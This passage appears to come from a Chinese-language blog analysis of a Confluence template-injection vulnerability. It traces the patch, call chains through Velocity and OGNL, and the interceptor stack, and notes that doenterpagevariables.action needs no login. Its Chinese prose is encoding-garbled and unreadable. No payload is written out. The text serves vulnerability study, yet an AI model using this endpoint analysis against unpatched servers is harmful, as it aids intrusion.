class="code"><pre><span class="line">value&#x3D;&#39;$!querystring&#39; &#x3D;&gt; value&#x3D;querystring</span><br><span class="line">value&#x3D;&#39;$linkCreation&#39; &#x3D;&gt; value&#x3D;linkCreation</span><br></pre></td></tr></table></figure></li><li><p>confluence/template/custom/content-editor.vm</p><p> å¯¹å¤šä¸ªinputæ ‡ç­¾è¿›è¡Œäº†valueçš„æ›¿æ¢ï¼Œä¸»è¦æ˜¯å°†valueä¸­çš„$å»æ‰</p><p> <code>&quot;Hidden&quot; &quot;name=&#39;linkCreation&#39;&quot; &quot;value=&#39;$isLinkCreation&#39;&quot; =&gt; &quot;Hidden&quot; &quot;name=&#39;linkCreation&#39;&quot; &quot;value=isLinkCreation&quot;</code></p></li><li><p>JARæ–‡ä»¶çš„ä¸­templates/editor-preload-container.vm</p><p> <code>value=&#39;$!&#123;action.syncRev&#125;&#39; =&gt; value=syncRev</code></p></li></ol><p>ä»¥doenterpagevariables.action ä¸ºä¾‹</p><p><img src="/images/pasted-234.png" alt="upload successful"></p><h2 id="0x03-åŸç†è§£æ"><a href="#0x03-åŸç†è§£æ" class="headerlink" title="0x03 åŸç†è§£æ"></a>0x03 åŸç†è§£æ</h2><h3 id="3-1-doenterpagevariables-action-è°ƒç”¨é“¾è·Ÿè¸ª"><a href="#3-1-doenterpagevariables-action-è°ƒç”¨é“¾è·Ÿè¸ª" class="headerlink" title="3.1 doenterpagevariables.action è°ƒç”¨é“¾è·Ÿè¸ª"></a>3.1 doenterpagevariables.action è°ƒç”¨é“¾è·Ÿè¸ª</h3><p>é¡ºç€æ‰§è¡Œè·Ÿè¸ª</p><h4 id="1-doenterpagevariables-action"><a href="#1-doenterpagevariables-action" class="headerlink" title="1. doenterpagevariables.action"></a>1. doenterpagevariables.action</h4><p>æ ¹æ®è¡¥ä¸æ¶ˆæ¯ï¼Œå¯ä»¥å®šä½åˆ°createpage-entervariables.vmï¼Œå¯¹åº”actionä¸ºdoenterpagevariables</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;doenterpagevariables&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageVariablesAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doEnter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-PageVariablesAction-doEnter"><a href="#2-PageVariablesAction-doEnter" class="headerlink" title="2. PageVariablesAction#doEnter"></a>2. PageVariablesAction#doEnter</h4><p>åœ¨PageVariablesAction#doEnterï¼Œdebugæ‰“ç‚¹å‘ç°æœªè¿›å…¥</p><p>æ­¤å°ç»“ä¸æ•´ä½“è·Ÿè¸ªæ— å…³ï¼Œä»…æ¢è®¨ä¸ºä½•æœªè¿›å…¥debug</p><p>struts2 æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼Œinterceptors ä¸€ä¸ªä¸ªæ‰§è¡Œï¼Œå¦‚æœå“ªä¸€ä¸ªè¿”å›äº†æœ‰æ•ˆçš„resultï¼Œåˆ™ä¸ä¼šè¿›å…¥åç»­çš„æµç¨‹äº†ã€‚<br><img src="/images/pasted-241.png" alt="upload successful"></p><p>æ‰§è¡Œåˆ°ConfluenceXsrfTokenInterceptorï¼Œè¿”å›äº†â€inputâ€ resultï¼Œç›´æ¥è¿›è¡Œäº†executeResultï¼Œå› æ­¤é¿å¼€äº†doEnter æ–¹æ³•ã€‚</p><p><img src="/images/pasted-242.png" alt="upload successful"></p><h4 id="3-è¿”å›-inputï¼Œè¿›è¡ŒVelocityæ¸²æŸ“-createpage-entervariables-vm"><a href="#3-è¿”å›-inputï¼Œè¿›è¡ŒVelocityæ¸²æŸ“-createpage-entervariables-vm" class="headerlink" title="3. è¿”å› inputï¼Œè¿›è¡ŒVelocityæ¸²æŸ“ createpage-entervariables.vm"></a>3. è¿”å› inputï¼Œè¿›è¡ŒVelocityæ¸²æŸ“ createpage-entervariables.vm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;filltemplateform&quot; method&#x3D;&quot;POST&quot; action&#x3D;&quot;doenterpagevariables.action&quot;&gt;</span><br><span class="line">    #form_xsrfToken()</span><br><span class="line">    #tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;queryString&#39;&quot; &quot;value&#x3D;&#39;$!queryString&#39;&quot;)</span><br><span class="line">    #tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;templateId&#39;&quot; &quot;value&#x3D;&#39;$pageTemplate.id&#39;&quot;)</span><br></pre></td></tr></table></figure><h4 id="4-AbstractTagDirective-tagå­è¯­å¥"><a href="#4-AbstractTagDirective-tagå­è¯­å¥" class="headerlink" title="4. AbstractTagDirective tagå­è¯­å¥"></a>4. AbstractTagDirective tagå­è¯­å¥</h4><p>æ¸²æŸ“Tag #tag (â€œHiddenâ€ â€œname=â€™queryStringâ€™â€ â€œvalue=â€™$!queryStringâ€™â€)</p><p>æ­¤åˆ»Tag æœ‰3ä¸ªå­èŠ‚ç‚¹</p><p><img src="/images/pasted-236.png" alt="upload successful"></p><h4 id="5-ç¬¬ä¸‰ä¸ªå­èŠ‚ç‚¹ASTStringLiteral"><a href="#5-ç¬¬ä¸‰ä¸ªå­èŠ‚ç‚¹ASTStringLiteral" class="headerlink" title="5. ç¬¬ä¸‰ä¸ªå­èŠ‚ç‚¹ASTStringLiteral"></a>5. ç¬¬ä¸‰ä¸ªå­èŠ‚ç‚¹ASTStringLiteral</h4><p>ç¬¬ä¸‰ä¸ªå­èŠ‚ç‚¹ASTStringLiteral#value</p><p>Velocity ä¸€æ–‡ä¸­æœ‰å•ç‹¬ä»‹ç»ASTStringLiteral èŠ‚ç‚¹ï¼Œä¸è¿‡è¿™é‡Œç¨ä¸ºå¤æ‚ç‚¹ï¼Œinterpolateä¸ºtrueï¼Œéœ€è¦<br><code>this.nodeTree.render(context, writer);</code><br>å…¶nodeTree ä¸ºASTReference</p><h4 id="6-å­èŠ‚ç‚¹ASTReference-getVariableValue"><a href="#6-å­èŠ‚ç‚¹ASTReference-getVariableValue" class="headerlink" title="6. å­èŠ‚ç‚¹ASTReference#getVariableValue"></a>6. å­èŠ‚ç‚¹ASTReference#getVariableValue</h4><p>è¿›è¿‡ä¸€äº›åˆ—çš„è°ƒç”¨ï¼Œæœ€ç»ˆåˆ°æ‰§è¡Œåˆ°getVariableValue æ–¹æ³•ï¼ŒåŠŸèƒ½ä¸ºä»contextä¸­è·å–valueå€¼</p><h5 id="6-1-InternalContextAdapterImpl-amp-WebWorkVelocityContext"><a href="#6-1-InternalContextAdapterImpl-amp-WebWorkVelocityContext" class="headerlink" title="6.1 InternalContextAdapterImpl &amp; WebWorkVelocityContext"></a>6.1 InternalContextAdapterImpl &amp; WebWorkVelocityContext</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.context.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this.context ç±»ä¸ºOutputAwareWebWorkVelocityContext<br>OutputAwareWebWorkVelocityContext extends WebWorkVelocityContext</p><p>WebWorkVelocityContext åœ¨Velocityé‚£ä¸€ä¾¿æ–‡ç« ä¸­æœ‰è®²åˆ°</p><p>ä¼šå°è¯•ä»ä¸€ä¸‹contextä¸­è·å–</p><ol><li>context</li><li>stack.findValue</li><li>chainedContexts</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">internalGet</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">super</span>.internalContainsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.internalGet(key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.stack != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object object = <span class="keyword">this</span>.stack.findValue(key);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">this</span>.chainedContexts.length; ++index) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts[index].containsKey(key)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.chainedContexts[index].internalGet(key);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-237.png" alt="upload successful"></p><p><img src="/images/pasted-238.png" alt="upload successful"></p><h5 id="6-2-queryString-å¦‚ä½•èµ‹å€¼çš„"><a href="#6-2-queryString-å¦‚ä½•èµ‹å€¼çš„" class="headerlink" title="6.2 queryString å¦‚ä½•èµ‹å€¼çš„"></a>6.2 queryString å¦‚ä½•èµ‹å€¼çš„</h5><p>root ä¸ºPageVariablesActionï¼Œæœ‰ä¸ªqueryString å±æ€§ï¼Œæ­¤åˆ»å°±æ˜¯postå‚æ•°ã€‚</p><p>é‚£ä¹ˆæ˜¯å¦‚ä½•èµ‹å€¼çš„å‘¢ï¼Ÿ</p><p>ç»“è®ºæ˜¯åœ¨SafeParametersInterceptor ä¸­èµ‹å€¼çš„</p><p><img src="/images/pasted-239.png" alt="upload successful"></p><p>æœ€ç»ˆæ—¶é€šè¿‡Ognl.setValue è¿›è¡Œèµ‹å€¼çš„</p><p>ASTProperty.setValueBody ç»è¿‡ä¸€äº›åˆ—çš„è°ƒç”¨ï¼Œæœ€ç»ˆè°ƒç”¨AbstractCreatePageAction.setQueryString å®ç°èµ‹å€¼ï¼Œå…·ä½“è°ƒç”¨æ ˆå¦‚ä¸‹</p><p>å®Œæ•´çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">setQueryString:381, AbstractCreatePageAction (com.atlassian.confluence.pages.actions)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:566, Method (java.lang.reflect)</span><br><span class="line">invokeMethod:500, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:794, OgnlRuntime (ognl)</span><br><span class="line">setMethodValue:946, OgnlRuntime (ognl)</span><br><span class="line">setPossibleProperty:76, ObjectPropertyAccessor (ognl)</span><br><span class="line">setProperty:132, ObjectPropertyAccessor (ognl)</span><br><span class="line">setProperty:1613, OgnlRuntime (ognl)</span><br><span class="line">setProperty:45, CompoundRootAccessor (com.opensymphony.xwork.util)</span><br><span class="line">setProperty:1613, OgnlRuntime (ognl)</span><br><span class="line">setValueBody:105, ASTProperty (ognl)</span><br><span class="line">evaluateSetValueBody:180, SimpleNode (ognl)</span><br><span class="line">setValue:230, SimpleNode (ognl)</span><br><span class="line">setValue:476, Ognl (ognl)</span><br><span class="line">setValue:189, OgnlUtil (com.opensymphony.xwork.util)</span><br><span class="line">setValue:113, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">setValue:97, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">before:142, SafeParametersInterceptor (com.atlassian.xwork.interceptors)</span><br></pre></td></tr></table></figure><!-- ç¥å¥‡çš„æ˜¯setValue rootä¸ºæ•°ç»„å±…ç„¶ä¹Ÿå¯è¡Œã€‚--><h4 id="7-findValue"><a href="#7-findValue" class="headerlink" title="7. findValue"></a>7. findValue</h4><p>getVariableValue ä¼šé€šè¿‡OgnlValueStack.findValue å®ç°ä»stack rootä¸­è·å–queryString</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">findValue:137, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">internalGet:72, WebWorkVelocityContext (com.opensymphony.webwork.views.velocity)</span><br><span class="line">get:193, AbstractContext (org.apache.velocity.context)</span><br><span class="line">get:286, InternalContextAdapterImpl (org.apache.velocity.context)</span><br><span class="line">getVariableValue:843, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">execute:222, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:342, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br><span class="line">value:290, ASTStringLiteral (org.apache.velocity.runtime.parser.node)</span><br><span class="line">putProperty:370, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">createPropertyMap:240, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">applyAttributes:394, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:111, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:72, ASTBlock (org.apache.velocity.runtime.parser.node)</span><br><span class="line">getRenderedTagBody:179, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:154, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br><span class="line">merge:328, Template (org.apache.velocity)</span><br></pre></td></tr></table></figure><h4 id="8-setValue-amp-setName"><a href="#8-setValue-amp-setName" class="headerlink" title="8. setValue &amp; setName"></a>8. setValue &amp; setName</h4><p>AbstractUITag</p><h4 id="9-äºŒæ¬¡findValue"><a href="#9-äºŒæ¬¡findValue" class="headerlink" title="9. äºŒæ¬¡findValue"></a>9. äºŒæ¬¡findValue</h4><p>ä½†æ˜¯æ˜¯å¦‚ä½•è§£æçš„å‘¢ï¼Ÿç­”æ¡ˆåœ¨AbstractUITag#evaluateParams</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">evaluateParams:378, AbstractUITag (com.opensymphony.webwork.views.jsp.ui)</span><br><span class="line">doEndTag:213, AbstractUITag (com.opensymphony.webwork.views.jsp.ui)</span><br><span class="line">processTag:349, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:122, AbstractTagDirective (com.opensymphony.webwork.views.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:72, ASTBlock (org.apache.velocity.runtime.parser.node)</span><br><span class="line">getRenderedTagBody:179, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:154, ApplyDecoratorDirective (com.atlassian.confluence.setup.velocity)</span><br><span class="line">render:175, ASTDirective (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:336, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h3 id="3-2-createpage-action-åˆ©ç”¨é“¾"><a href="#3-2-createpage-action-åˆ©ç”¨é“¾" class="headerlink" title="3.2 createpage.action åˆ©ç”¨é“¾"></a>3.2 createpage.action åˆ©ç”¨é“¾</h3><p>createpage ä¸ä»¥ä¸Šç±»ä¼¼ï¼Œåªä¸è¿‡éœ€è¦ç™»å½•</p><ol><li>content-editor.vm</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;queryString&#x27;&quot; &quot;value=&#x27;$!queryString&#x27;&quot;)</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;fromPageId&#x27;&quot; &quot;value=&#x27;$fromPageId&#x27;&quot;)</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;spaceKey&#x27;&quot; &quot;value=spaceKey&quot;)</span><br><span class="line">...</span><br><span class="line">        #tag (&quot;Hidden&quot; &quot;name=&#x27;linkCreation&#x27;&quot; &quot;value=&#x27;$isLinkCreation&#x27;&quot;)</span><br></pre></td></tr></table></figure><p>7.4.10ç‰ˆæœ¬ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å‡ å¤„å¯ä»¥è§¦å‘</p><ol start="2"><li>CreatePageAction</li></ol><p>createpage.vm â€“ createpage-form.vm â€“ content-editor.vm</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;createpage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.CreatePageEntryAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDefault&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä»–ä¸ä»¥ä¸Šéƒ½ç±»ä¼¼ï¼Œpocå¦‚ä¸‹</p><p><img src="/images/pasted-243.png" alt="upload successful"></p><h2 id="0x04-æ‰©å±•æ€è€ƒ"><a href="#0x04-æ‰©å±•æ€è€ƒ" class="headerlink" title="0x04 æ‰©å±•æ€è€ƒ"></a>0x04 æ‰©å±•æ€è€ƒ</h2><h3 id="4-1-Confluence-çš„è´¦å·æƒé™é€»è¾‘"><a href="#4-1-Confluence-çš„è´¦å·æƒé™é€»è¾‘" class="headerlink" title="4.1 Confluence çš„è´¦å·æƒé™é€»è¾‘"></a>4.1 Confluence çš„è´¦å·æƒé™é€»è¾‘</h3><h4 id="4-1-1-ç™»å½•"><a href="#4-1-1-ç™»å½•" class="headerlink" title="4.1.1 ç™»å½•"></a>4.1.1 ç™»å½•</h4><p>ä¸Šæ–‡ä¸­çš„doenterpagevariables.action æ— éœ€ç™»å½•ï¼Œcreatepage.actionéœ€è¦ã€‚Confluence æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ</p><p>è¿™äº›å…¶å®æ˜¯struts2 çš„åŸºç¡€æ¶æ„çŸ¥è¯†ï¼Œä¹‹å‰æ²¡ç†è¿‡ï¼Œç°åœ¨ç†ä¸€éã€‚</p><p>ä»¥createpage.actionä¸ºä¾‹</p><ol><li><p>defaultStack</p><p> åœ¨xwork.xml struts2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°createpage action å¯¹åº”çš„interceptors ä¸ºdefaultStack</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;createpage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.CreatePageEntryAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDefault&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>interceptors</p><p> defaultStack å…·ä½“åŒ…å«ä¸€ä¸‹interceptors</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0 &#x3D; &#123;XWorkProfilingInterceptor@44739&#125; </span><br><span class="line">1 &#x3D; &#123;SecurityHeadersInterceptor@44747&#125; </span><br><span class="line">2 &#x3D; &#123;SetupIncompleteInterceptor@44748&#125; </span><br><span class="line">3 &#x3D; &#123;ConfluenceXWorkTransactionInterceptor@44724&#125; </span><br><span class="line">4 &#x3D; &#123;SafeParametersInterceptor@44714&#125; </span><br><span class="line">5 &#x3D; &#123;ConfluenceAutowireInterceptor@44749&#125; </span><br><span class="line">6 &#x3D; &#123;LastModifiedInterceptor@44750&#125; </span><br><span class="line">7 &#x3D; &#123;ServletConfigInterceptor@44751&#125; </span><br><span class="line">8 &#x3D; &#123;FlashScopeInterceptor@44752&#125; </span><br><span class="line">9 &#x3D; &#123;ConfluenceAccessInterceptor@44753&#125; </span><br><span class="line">10 &#x3D; &#123;SpaceAwareInterceptor@44754&#125; </span><br><span class="line">11 &#x3D; &#123;PageAwareInterceptor@44755&#125; </span><br><span class="line">12 &#x3D; &#123;CommentAwareInterceptor@44756&#125; </span><br><span class="line">13 &#x3D; &#123;UserAwareInterceptor@44757&#125; </span><br><span class="line">14 &#x3D; &#123;PrepareInterceptor@44758&#125; </span><br><span class="line">15 &#x3D; &#123;BootstrapAwareInterceptor@44759&#125; </span><br><span class="line">16 &#x3D; &#123;PermissionCheckInterceptor@44760&#125; </span><br><span class="line">17 &#x3D; &#123;ThemeContextInterceptor@44761&#125; </span><br><span class="line">18 &#x3D; &#123;WebSudoInterceptor@44762&#125; </span><br><span class="line">19 &#x3D; &#123;HttpMethodValidationInterceptor@44763&#125; </span><br><span class="line">20 &#x3D; &#123;CancellingInterceptor@44764&#125; </span><br><span class="line">21 &#x3D; &#123;LoggingContextInterceptor@44765&#125; </span><br><span class="line">22 &#x3D; &#123;EventPublisherInterceptor@44766&#125; </span><br><span class="line">23 &#x3D; &#123;MessageHolderInterceptor@44767&#125; </span><br><span class="line">24 &#x3D; &#123;HttpRequestStatsInterceptor@44768&#125; </span><br><span class="line">25 &#x3D; &#123;ConfluenceLicenseInterceptor@44769&#125; </span><br><span class="line">26 &#x3D; &#123;ConfluenceXsrfTokenInterceptor@44770&#125; </span><br><span class="line">27 &#x3D; &#123;XWorkProfilingInterceptor@44771&#125; </span><br></pre></td></tr></table></figure><ol start="3"><li>DefaultActionInvocation#invoke</li></ol><p>DefaultActionInvocation#invoke ä¼šæŒ‰é¡ºåºè°ƒç”¨ä»¥ä¸Šinterceptor#invokeï¼Œç›´è‡³æœ‰æœ‰æ•ˆçš„result</p><ol start="4"><li>PageAwareInterceptor</li></ol><p>å½“æ‰§è¡Œè‡³PageAwareInterceptorï¼Œä¼šåˆ¤æ–­æ˜¯å¦ç™»å½•ã€æ£€éªŒæƒé™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Ticker ignored = Timers.start(<span class="string">&quot;PageAwareInterceptor.intercept()&quot;</span>);</span><br><span class="line">    Throwable var3 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Action action = actionInvocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (!(action <span class="keyword">instanceof</span> PageAware)) &#123;</span><br><span class="line">            String var23 = actionInvocation.invoke();</span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            PageAware pageAware = (PageAware)action;</span><br><span class="line">            Result result = ((PageAwareHelper)<span class="keyword">this</span>.helperRef.get()).configure(pageAware, ServletActionContext.getRequest(), <span class="keyword">this</span>::getParameter);</span><br><span class="line">            String var7;</span><br><span class="line">            <span class="keyword">switch</span>(result) &#123;</span><br><span class="line">            <span class="keyword">case</span> NOT_PERMITTED:</span><br><span class="line">                var7 = <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> PAGE_NOT_PERMITTED:</span><br><span class="line">                var7 = <span class="string">&quot;pagenotpermitted&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> PAGE_NOT_FOUND:</span><br><span class="line">                var7 = <span class="string">&quot;pagenotfound&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            <span class="keyword">case</span> READ_ONLY:</span><br><span class="line">                var7 = <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br></pre></td></tr></table></figure><ol 